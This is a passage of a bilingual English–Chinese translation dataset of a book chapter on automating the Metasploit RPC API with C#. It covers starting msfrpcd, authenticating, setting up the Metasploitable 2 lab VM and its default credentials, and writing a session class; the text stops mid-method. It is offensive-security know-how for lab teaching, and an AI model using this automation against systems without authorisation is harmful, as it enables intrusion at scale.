- en: '11'
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: '11'
- en: AUTOMATING METASPLOIT
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 自动化 Metasploit
- en: '![](images/00010.jpg)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00010.jpg)'
- en: Metasploit is the de facto open source penetration-testing framework. Written
    in Ruby, Metasploit is both an exploit database and a framework for exploit development
    and penetration testing. But many of Metasploit’s most powerful features, such
    as its remote procedure call (RPC) API, are often overlooked.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 是事实上的开源渗透测试框架。Metasploit 用 Ruby 编写，既是一个漏洞数据库，也是一个漏洞开发和渗透测试的框架。但是，Metasploit
    的许多强大功能，比如其远程过程调用（RPC）API，经常被忽视。
- en: This chapter introduces you to the Metasploit RPC and shows you how to use it
    to programmatically drive the Metasploit Framework. You’ll learn how to use the
    RPC to automate Metasploit to exploit Metasploitable 2, an intentionally vulnerable
    Linux machine designed for learning how to use Metasploit. Red teams or offensive
    security professionals should note that many pieces of tedious work can be automated,
    thus freeing up time to focus more on the intricate or nonobvious vulnerabilities.
    With an API-driven Metasploit Framework at your fingertips, you’ll be able to
    automate tedious tasks such as host discovery and even network exploitation in
    a scaleable way.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将介绍 Metasploit RPC，并展示如何使用它以编程方式操作 Metasploit Framework。你将学习如何使用 RPC 自动化 Metasploit，利用它对
    Metasploitable 2 进行攻击，Metasploitable 2 是一台故意设计为漏洞机器的 Linux 系统，旨在帮助学习如何使用 Metasploit。红队或进攻性安全专家应注意，许多繁琐的工作可以通过自动化来完成，从而腾出更多时间专注于复杂或不明显的漏洞。通过
    API 驱动的 Metasploit Framework，你将能够以可扩展的方式自动化诸如主机发现甚至网络利用等繁琐任务。
- en: Running the RPC Server
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 运行 RPC 服务器
- en: Since we set up Metasploit in [Chapter 4](index_split_009.html#filepos344540),
    I won’t go over how to set it up again here. [Listing 11-1](#filepos763310) shows
    what you need to enter in order to run the RPC server.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们在 [第 4 章](index_split_009.html#filepos344540) 已经设置了 Metasploit，这里不再赘述设置过程。[Listing
    11-1](#filepos763310) 显示了运行 RPC 服务器时需要输入的内容。
- en: '$ msfrpcd -U username -P password -S -f  Listing 11-1: Running the RPC server'
  id: totrans-7
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '$ msfrpcd -U username -P password -S -f  Listing 11-1: 运行 RPC 服务器'
- en: The -U and -P arguments stand for the username and password that authenticate
    the RPC. You can use whatever you want for the username or password, but you will
    need the credentials when we write the C# code. The -S argument disables SSL.
    (Self-signed certificates make things a bit more complicated, so we’ll ignore
    them for now.) Finally, -f tells the RPC interface to run in the foreground to
    make the RPC process easier to monitor.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: -U 和 -P 参数代表用于验证 RPC 的用户名和密码。你可以为用户名或密码选择任何值，但当我们编写 C# 代码时需要用到这些凭证。-S 参数禁用 SSL。（自签名证书会让事情变得更复杂，因此我们暂时忽略它们。）最后，-f
    参数告诉 RPC 接口在前台运行，以便更容易监控 RPC 进程。
- en: 'To use the new RPC interface that is running, either start a new terminal or
    restart msfrpcd without the -f option (which starts msfrpcd in the background)
    and then use Metasploit’s msfrpc client to connect to the RPC listener that was
    just started and begin issuing calls. Be forewarned, though: the msfrpc client
    is rather cryptic—it’s difficult to read and has unintuitive error messages. [Listing
    11-2](#filepos765738) shows the process of authenticating with the msfrpcd server
    using the msfrpc client shipped with Metasploit.'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用正在运行的新 RPC 接口，首先启动一个新终端，或者在没有 -f 选项的情况下重启 msfrpcd（该选项启动 msfrpcd 并将其放入后台运行），然后使用
    Metasploit 的 msfrpc 客户端连接到刚刚启动的 RPC 监听器，并开始发出调用。不过需要提醒的是：msfrpc 客户端的界面相当晦涩难懂——它很难阅读，而且错误信息不直观。[Listing
    11-2](#filepos765738) 展示了如何使用 Metasploit 提供的 msfrpc 客户端进行身份验证。
- en: $ msfrpc ➊-U  username ➋-P  password ➌-S ➍-a 127.0.0.1
  id: totrans-10
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ msfrpc ➊-U  username ➋-P  password ➌-S ➍-a 127.0.0.1
- en: '[*] The ''rpc'' object holds the RPC client interface'
  id: totrans-11
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[*] ''rpc'' 对象包含 RPC 客户端接口'
- en: '[*] Use rpc.call(''group.command'') to make RPC calls'
  id: totrans-12
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[*] 使用 rpc.call(''group.command'') 发出 RPC 调用'
- en: ''
  id: totrans-13
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '>> ➎rpc.call(''auth.login'', ''username'', ''password'')'
  id: totrans-14
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '>> ➎rpc.call(''auth.login'', ''username'', ''password'')'
- en: => {"result"=>"success", "token"=>"TEMPZYFJ3CWFxqnBt9AfjvofOeuhKbbx"}
  id: totrans-15
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: => {"result"=>"success", "token"=>"TEMPZYFJ3CWFxqnBt9AfjvofOeuhKbbx"}
- en: 'Listing 11-2: Using the  msfrpc  client to authenticate with the  msfrpcd  server'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 'Listing 11-2: 使用 msfrpc 客户端与 msfrpcd 服务器进行身份验证'
- en: To connect to the RPC listener with msfrpcd, we pass a few arguments to msfrpcd.
    The username and password we set on the RPC listener for authentication are passed
    with -U ➊ and -P ➋, respectively. The -S argument ➌ tells msfrpc to not use SSL
    when connecting to the listener, and the -a argument ➍ is the IP address to which
    the listener connects. Since we started our msfrpcd instance without specifying
    an IP address to listen on, the default address of 127.0.0.1 is used.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 为了通过msfrpcd连接到RPC监听器，我们向msfrpcd传递几个参数。我们为RPC监听器设置的用户名和密码用于身份验证，通过-U ➊和-P ➋传递。-S参数
    ➌告诉msfrpc不要使用SSL连接监听器，-a参数 ➍是监听器连接的IP地址。由于我们启动msfrpcd实例时没有指定监听的IP地址，因此默认使用127.0.0.1地址。
- en: Once connected to the RPC listener, we can use rpc.call() ➎ to call API methods
    that are available. We are going to test with the auth.login remote procedure
    method because it will use the same username and password we passed as the arguments.
    When you call rpc.call(), the RPC method and arguments are packed into a serialized
    MSGPACK blob that is sent to the RPC server using an HTTP post request with a
    content type of binary/message-pack. These are important points to note because
    we need to do the same things in C# to communicate with the RPC server.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦连接到RPC监听器，我们可以使用rpc.call() ➎来调用可用的API方法。我们将使用auth.login远程过程方法进行测试，因为它将使用我们传递的相同用户名和密码作为参数。当你调用rpc.call()时，RPC方法和参数会被打包成一个序列化的MSGPACK二进制数据块，通过HTTP
    POST请求以binary/message-pack的内容类型发送到RPC服务器。这些是需要注意的重要点，因为我们在C#中也需要做同样的事情与RPC服务器进行通信。
- en: We already have a lot of experience with the HTTP libraries, but MSGPACK serialization
    is certainly not a typical HTTP serialization format (you’re more likely to see
    XML or JSON). MSGPACK allows C# to read and respond with complex data from the
    Ruby RPC server very efficiently, just as using JSON or XML would have been a
    potential bridge for the two languages. As we work with MSGPACK, it should become
    clearer how MSGPACK serialization works.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经有了很多关于HTTP库的经验，但MSGPACK序列化肯定不是一个典型的HTTP序列化格式（你更可能看到XML或JSON）。MSGPACK使得C#可以非常高效地从Ruby
    RPC服务器读取和响应复杂数据，正如使用JSON或XML也可能是两个语言之间的桥梁。当我们使用MSGPACK时，序列化的工作方式应该会变得更加清晰。
- en: Installing Metasploitable
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 安装Metasploitable
- en: 'Metasploitable 2 has a specific vulnerability that is particularly simple to
    exploit: a backdoored Unreal IRC server. This is a great example of a vulnerability
    with a Metasploit module that we can cut our teeth on with the Metasploit RPC.
    You can download Metasploitable 2 from either Rapid7 at [https://information.rapid7.com/metasploitable-download.html](https://information.rapid7.com/metasploitable-download.html)
    or VulnHub at [https://www.vulnhub.com/](https://www.vulnhub.com/).'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploitable 2存在一个特别容易利用的漏洞：一个被植入后门的Unreal IRC服务器。这是一个很好的示例，展示了我们可以用Metasploit
    RPC来攻克的漏洞，且配有Metasploit模块。你可以从Rapid7的[https://information.rapid7.com/metasploitable-download.html](https://information.rapid7.com/metasploitable-download.html)或VulnHub的[https://www.vulnhub.com/](https://www.vulnhub.com/)下载Metasploitable
    2。
- en: 'Metasploitable is shipped as a VMDK image in a ZIP archive, so installing it
    into VirtualBox isn’t completely straightforward. After unzipping the Metasploitable
    VM and opening VirtualBox, follow these instructions:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploitable以VMDK镜像文件形式打包在一个ZIP压缩包中，因此将其安装到VirtualBox并不完全简单。解压Metasploitable虚拟机并打开VirtualBox后，按照以下步骤操作：
- en: Click the New button in the top-left corner of VirtualBox to open the wizard.
  id: totrans-23
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击VirtualBox左上角的“新建”按钮，打开向导。
- en: Create a new VM named Metasploitable.
  id: totrans-24
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 创建一个名为Metasploitable的新虚拟机。
- en: Give it a Type of Linux and leave the Version as Ubuntu (64-bit); then click
    continue or Next.
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将类型设置为Linux，版本保持为Ubuntu（64位）；然后点击继续或下一步。
- en: Allocate between 512 MB and 1 GB RAM to the VM and then click continue or Next.
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为虚拟机分配512 MB至1 GB的RAM，然后点击继续或下一步。
- en: In the Hard Disk dialog, select the Use an existing virtual hard disk file option.
  id: totrans-27
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在硬盘对话框中，选择“使用现有的虚拟硬盘文件”选项。
- en: Next to the hard disk drop-down is a small folder icon. Click this and navigate
    to the folder into which you unzipped Metasploitable.
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在硬盘下拉菜单旁边有一个小文件夹图标。点击它并导航到你解压Metasploitable的文件夹。
- en: Select the Metasploitable VMDK file and click Open in the bottom right of the
    dialog.
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择Metasploitable VMDK文件并在对话框的右下角点击“打开”。
- en: In the Hard Disk dialog, click the Create button. This should close the VM wizard.
  id: totrans-30
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在硬盘对话框中，点击“创建”按钮。这将关闭虚拟机向导。
- en: Start the new VM by clicking the Start button at the top of the VirtualBox window.
  id: totrans-31
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过点击VirtualBox窗口顶部的“启动”按钮来启动新的虚拟机。
- en: Once the virtual appliance has booted up, we need its IP address. To get the
    IP, after the appliance has booted up, log in with the credentials msfadmin/msfadmin
    and then enter ifconfig at the bash shell to have the IP configuration printed
    to the screen.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦虚拟设备启动完成，我们需要它的IP地址。获取IP地址的方法是：设备启动后，用凭据msfadmin/msfadmin登录，然后在bash shell中输入ifconfig命令，将IP配置信息打印到屏幕上。
- en: Getting the MSGPACK Library
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 获取MSGPACK库
- en: 'We need to get one more thing before we can start writing the code to drive
    our Metasploit instance using C#: the MSGPACK library. This library is not part
    of the core C# libraries, so we have to use NuGet, which is a .NET package manager
    like pip (Python) or gem (Ruby), to install the correct library we want to use.
    By default, Visual Studio and Xamarin Studio have great NuGet package management
    support. However, the free MonoDevelop available for Linux distros isn’t as up-to-date
    with the NuGet features as these other IDEs. Let’s go over installing the correct
    MSGPACK library in MonoDevelop. It’s a bit roundabout, but using Xamarin Studio
    and Visual Studio should be much simpler because they don’t require you to use
    a specific version of the MSGPACK library.'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始编写C#代码来驱动我们的Metasploit实例之前，我们需要再获取一件事：MSGPACK库。这个库不是C#核心库的一部分，因此我们必须使用NuGet，它是一个.NET包管理器，类似于Python的pip或Ruby的gem，来安装我们想要使用的正确库。默认情况下，Visual
    Studio和Xamarin Studio对NuGet包管理有很好的支持。然而，适用于Linux发行版的免费MonoDevelop在NuGet功能方面没有这些IDE那么先进。让我们来看一下如何在MonoDevelop中安装正确的MSGPACK库。这有点曲折，但使用Xamarin
    Studio和Visual Studio会更简单，因为它们不需要你使用特定版本的MSGPACK库。
- en: Installing the NuGet Package Manager for MonoDevelop
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 为MonoDevelop安装NuGet包管理器
- en: 'First, you may need to install the NuGet add-in using the Add-in Manager in
    MonoDevelop. If so, open MonoDevelop and then follow these steps to install the
    NuGet package manager:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，你可能需要使用MonoDevelop中的“附加组件管理器”安装NuGet附加组件。如果是这样，打开MonoDevelop并按照以下步骤安装NuGet包管理器：
- en: Go to the Tools ▸ Add-in Manager menu item.
  id: totrans-37
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入“工具” ▸ “附加组件管理器”菜单项。
- en: Click the Gallery tab.
  id: totrans-38
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“图库”选项卡。
- en: In the Repository drop-down list, select Manage Repositories.
  id: totrans-39
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在“仓库”下拉列表中，选择“管理仓库”。
- en: Click the Add button to add a new repository.
  id: totrans-40
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“添加”按钮以添加新仓库。
- en: 'In the Add New Repository dialog, ensure Register an on-line repository is
    selected. In the URL text box, enter the following URL: http://mrward.github.com/monodevelop-nuget-addin-repository/4.0/main.mrep'
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在“添加新仓库”对话框中，确保选中“注册在线仓库”。在URL文本框中，输入以下URL：http://mrward.github.com/monodevelop-nuget-addin-repository/4.0/main.mrep
- en: Click OK and close the Add New Repository dialog by clicking Close.
  id: totrans-42
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“确定”并通过点击“关闭”关闭“添加新仓库”对话框。
- en: With the new repository installed, you can install the NuGet package manager
    easily. After closing the repository dialog, you should be back on the Gallery
    tab in the Add-in Manager. In the top-right corner of the Add-in Manager is a
    text box for searching possible add-ins to install. Enter nuget into this box;
    it should filter the packages to show you the NuGet package manager. Select the
    NuGet extension and then click the Install button (see [Figure 11-1](#filepos774094)).
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 安装完新仓库后，你可以轻松安装NuGet包管理器。关闭仓库对话框后，你应该会回到附加组件管理器的“图库”选项卡。在附加组件管理器的右上角有一个文本框，可以用来搜索可安装的附加组件。输入nuget到该框中，它会筛选出NuGet包管理器。选择NuGet扩展，然后点击“安装”按钮（见[图11-1](#filepos774094)）。
- en: '![](images/00001.jpg)'
  id: totrans-44
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00001.jpg)'
- en: 'Figure 11-1: The MonoDevelop Add-in Manager installing NuGet'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 图11-1：MonoDevelop附加组件管理器安装NuGet
- en: Installing the MSGPACK Library
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 安装MSGPACK库
- en: Now that the NuGet package manager is installed, we can install our MSGPACK
    library. There is a small hitch, though. The best version of the MSGPACK library
    to install for MonoDevelop is 0.6.8 (for compatibility purposes), but the NuGet
    manager in MonoDevelop doesn’t allow us to specify a version and will try to install
    the latest version. We need to add a packages.config file manually to the project
    that specifies the version of the library we want, as shown in [Listing 11-3](#filepos775476).
    Right-click the Metasploit project in the Solution Explorer in MonoDevelop, Xamarin
    Studio, or Visual Studio. From the menu that appears, select Add ▸ New File and
    add a new file called packages.config.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，NuGet 包管理器已经安装，我们可以安装 MSGPACK 库了。不过有一个小问题。对于 MonoDevelop 来说，最适合安装的 MSGPACK
    库版本是 0.6.8（为了兼容性），但 MonoDevelop 中的 NuGet 管理器不允许我们指定版本，它会尝试安装最新版本。我们需要手动向项目中添加一个
    packages.config 文件，指定我们想要的库版本，如 [列表 11-3](#filepos775476) 所示。右键点击 MonoDevelop、Xamarin
    Studio 或 Visual Studio 中的 Metasploit 项目，在弹出的菜单中选择 添加 ▸ 新建文件，并添加一个名为 packages.config
    的新文件。
- en: <?xml version="1.0" encoding="utf-8"?>
  id: totrans-48
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: <?xml version="1.0" encoding="utf-8"?>
- en: <packages>
  id: totrans-49
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: <packages>
- en: <package id="MsgPack.Cli" version="0.6.8" targetFramework="net45" />
  id: totrans-50
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: <package id="MsgPack.Cli" version="0.6.8" targetFramework="net45" />
- en: '</packages> Listing 11-3: The packages.config file specifying the correct version
    of the MsgPack.Cli library'
  id: totrans-51
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: </packages> 列表 11-3：指定 MsgPack.Cli 库正确版本的 packages.config 文件
- en: After creating the packages.config file, restart MonoDevelop and open the project
    you created to run the Metasploit code we’ll soon write. You should now be able
    to right-click the project references and click the Restore NuGet Packages menu
    item, which will ensure the packages in the packages.config file are installed
    with the correct versions.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 创建完 packages.config 文件后，重新启动 MonoDevelop 并打开你创建的项目，以便运行我们接下来将编写的 Metasploit
    代码。现在，你应该能够右键点击项目引用，点击 “恢复 NuGet 包” 菜单项，这将确保 packages.config 文件中的包以正确的版本安装。
- en: Referencing the MSGPACK Library
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 引用 MSGPACK 库
- en: With the correct version of the MSGPACK library installed, we can now add it
    as a reference to the project so we can start writing some code. Usually NuGet
    would handle this for us, but this is a small bug in MonoDevelop that we must
    work around. Right-click the References folder in your MonoDevelop solution pane
    and select Edit References... (see [Figure 11-2](#filepos776770)).
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 安装好正确版本的 MSGPACK 库后，我们现在可以将其添加为项目的引用，以便开始编写代码。通常，NuGet 会为我们处理这一切，但在 MonoDevelop
    中有一个小 bug，我们必须绕过它。右键点击 MonoDevelop 解决方案面板中的 References 文件夹，选择 编辑引用...（参见 [图 11-2](#filepos776770)）。
- en: '![](images/00029.jpg)'
  id: totrans-55
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00029.jpg)'
- en: 'Figure 11-2: The Edit References... menu item in the solution pane'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11-2：解决方案面板中的 编辑引用... 菜单项
- en: The Edit References dialog should come up with a few tabs available, as shown
    in [Figure 11-3](#filepos777457). You want to select the .Net Assembly tab and
    then navigate to the MsgPack.dll assembly in the packages folder in the root of
    the project. This packages folder was created by NuGet automatically when you
    downloaded the MSGPACK library.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 编辑引用对话框应该会显示出几个可用的标签页，如 [图 11-3](#filepos777457) 所示。你需要选择 .Net Assembly 标签页，然后导航到项目根目录中的
    packages 文件夹下的 MsgPack.dll 程序集。这个 packages 文件夹是 NuGet 在你下载 MSGPACK 库时自动创建的。
- en: '![](images/00003.jpg)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00003.jpg)'
- en: 'Figure 11-3: The Edit References dialog'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11-3：编辑引用对话框
- en: After finding the MsgPack.dll library, select it and click OK in the bottom-right
    corner of the dialog. This should add the MsgPack.dll library to your project
    so that you can begin using the classes and referencing the library in your C#
    source files.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 在找到 MsgPack.dll 库后，选择它并点击对话框右下角的 OK 按钮。这样应该会将 MsgPack.dll 库添加到你的项目中，以便你可以开始使用类并在
    C# 源文件中引用该库。
- en: Writing the MetasploitSession Class
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 编写 MetasploitSession 类
- en: Now we need to build a MetasploitSession class to communicate with the RPC server,
    as shown in [Listing 11-4](#filepos779686).
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们需要构建一个 MetasploitSession 类来与 RPC 服务器进行通信，如 [列表 11-4](#filepos779686) 所示。
- en: 'public class MetasploitSession : IDisposable'
  id: totrans-63
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'public class MetasploitSession : IDisposable'
- en: '{'
  id: totrans-64
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string _host;
  id: totrans-65
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string _host;
- en: string _token;
  id: totrans-66
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string _token;
- en: ''
  id: totrans-67
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public MetasploitSession(➊string username, string password, string host)
  id: totrans-68
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public MetasploitSession(➊string username, string password, string host)
- en: '{'
  id: totrans-69
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: _host = host;
  id: totrans-70
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: _host = host;
- en: _token = null;
  id: totrans-71
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: _token = null;
- en: ''
  id: totrans-72
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Dictionary<object, object> response = this.➋Authenticate(username, password);
  id: totrans-73
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Dictionary<object, object> response = this.➋Authenticate(username, password);
- en: ''
  id: totrans-74
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ➌bool loggedIn = !response.ContainsKey("error");
  id: totrans-75
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➌bool loggedIn = !response.ContainsKey("error");
- en: if (!loggedIn)
  id: totrans-76
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (!loggedIn)
- en: ➍throw new Exception(response["error_message"] as string);
  id: totrans-77
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➍throw new Exception(response["error_message"] as string);
- en: ➎if ((response["result"] as string) == "success")
  id: totrans-78
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➎if ((response["result"] as string) == "success")
- en: _token = response["token"] as string;
  id: totrans-79
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: _token = response["token"] as string;
- en: '}'
  id: totrans-80
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-81
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public string ➏Token
  id: totrans-82
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public string ➏Token
- en: '{'
  id: totrans-83
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: get { return _token; }
  id: totrans-84
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: get { return _token; }
- en: '}'
  id: totrans-85
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-86
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> Authenticate(string username, string password)
  id: totrans-87
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> Authenticate(string username, string password)
- en: '{'
  id: totrans-88
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return this.➐Execute("auth.login", username, password);
  id: totrans-89
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return this.➐Execute("auth.login", username, password);
- en: '}'
  id: totrans-90
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-4: The  MetasploitSession  class constructor,  Token  property,
    and  Authenticate()  method'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 第11-4节：MetasploitSession类构造函数、Token属性和Authenticate()方法
- en: 'The MetasploitSession constructor takes three arguments, as shown at ➊: the
    username and password to authenticate with and the host to connect to. We call
    Authenticate() ➋ with the supplied username and password and then test for authentication
    by checking whether the response contains an error ➌. If the authentication fails,
    an exception is thrown ➍. If authentication succeeds, we assign the _token variable
    with the value of the authentication token returned by the RPC ➎ and make the
    Token ➏ public. The Authenticate() method calls the Execute() method ➐, passing
    in auth.login as the RPC method along with the username and password.'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: MetasploitSession构造函数接收三个参数，如➊所示：用于认证的用户名和密码，以及要连接的主机。我们使用提供的用户名和密码调用Authenticate()
    ➋，然后通过检查响应是否包含错误来验证认证 ➌。如果认证失败，则抛出异常 ➍。如果认证成功，我们将_token变量赋值为RPC返回的认证令牌 ➎，并将Token
    ➏设为public。Authenticate()方法调用Execute()方法 ➐，传入auth.login作为RPC方法以及用户名和密码。
- en: Creating the Execute() Method for HTTP Requests and Interacting with MSGPACK
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 创建Execute()方法用于HTTP请求并与MSGPACK交互
- en: The Execute() method shown in [Listing 11-5](#filepos783611) does the bulk of
    the work of the RPC library, creating and sending HTTP requests and serializing
    the RPC methods and arguments into MSGPACK.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: Execute()方法（见[第11-5节](#filepos783611)）是RPC库的核心，负责创建和发送HTTP请求，并将RPC方法和参数序列化为MSGPACK。
- en: public Dictionary<object, object> Execute(string method, params object[] args)
  id: totrans-95
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> Execute(string method, params object[] args)
- en: '{'
  id: totrans-96
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if ➊(method != "auth.login" && string.IsNullOrEmpty(_token))
  id: totrans-97
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if ➊(method != "auth.login" && string.IsNullOrEmpty(_token))
- en: throw new Exception("Not authenticated.");
  id: totrans-98
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: throw new Exception("未认证。");
- en: ''
  id: totrans-99
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: HttpWebRequest request = (HttpWebRequest)WebRequest.Create(_host);
  id: totrans-100
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: HttpWebRequest request = (HttpWebRequest)WebRequest.Create(_host);
- en: request.ContentType = ➋"binary/message-pack";
  id: totrans-101
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request.ContentType = ➋"binary/message-pack";
- en: request.Method = "POST";
  id: totrans-102
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request.Method = "POST";
- en: request.KeepAlive = true;
  id: totrans-103
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request.KeepAlive = true;
- en: ''
  id: totrans-104
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (Stream requestStream = request.GetRequestStream())
  id: totrans-105
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (Stream requestStream = request.GetRequestStream())
- en: using (Packer msgpackWriter = ➌Packer.Create(requestStream))
  id: totrans-106
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (Packer msgpackWriter = ➌Packer.Create(requestStream))
- en: '{'
  id: totrans-107
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: bool sendToken = (!string.IsNullOrEmpty(_token) && method != "auth.login");
  id: totrans-108
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bool sendToken = (!string.IsNullOrEmpty(_token) && method != "auth.login");
- en: 'msgpackWriter.➍PackArrayHeader(1 + (sendToken ? 1 : 0) + args.Length);'
  id: totrans-109
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'msgpackWriter.➍PackArrayHeader(1 + (sendToken ? 1 : 0) + args.Length);'
- en: msgpackWriter.Pack(method);
  id: totrans-110
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: msgpackWriter.Pack(method);
- en: ''
  id: totrans-111
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (sendToken)
  id: totrans-112
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (sendToken)
- en: msgpackWriter.Pack(_token);
  id: totrans-113
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: msgpackWriter.Pack(_token);
- en: ➎foreach (object arg in args)
  id: totrans-114
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➎foreach (object arg in args)
- en: msgpackWriter.Pack(arg);
